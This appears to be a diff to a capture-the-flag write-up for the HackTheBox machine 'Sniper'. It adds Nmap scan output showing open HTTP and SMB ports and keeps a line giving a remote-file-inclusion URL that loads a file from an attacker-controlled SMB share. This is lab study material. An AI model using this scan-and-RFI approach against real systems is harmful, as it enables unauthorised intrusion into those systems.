@@ -10,6 +10,21 @@ tags:
 
 # Sniper
 
+## Nmap Scan
+
+```
+Nmap scan report for 10.10.10.151
+Host is up (0.15s latency).
+Not shown: 996 filtered ports
+PORT    STATE SERVICE
+80/tcp  open  http
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 53.78 seconds
+```
+
 ## Initial Foothold
 
 http://sniper.htb/blog/?lang=\\xx.xx.xx.xx\share\test.php is vulnerable to RFI over SMB.
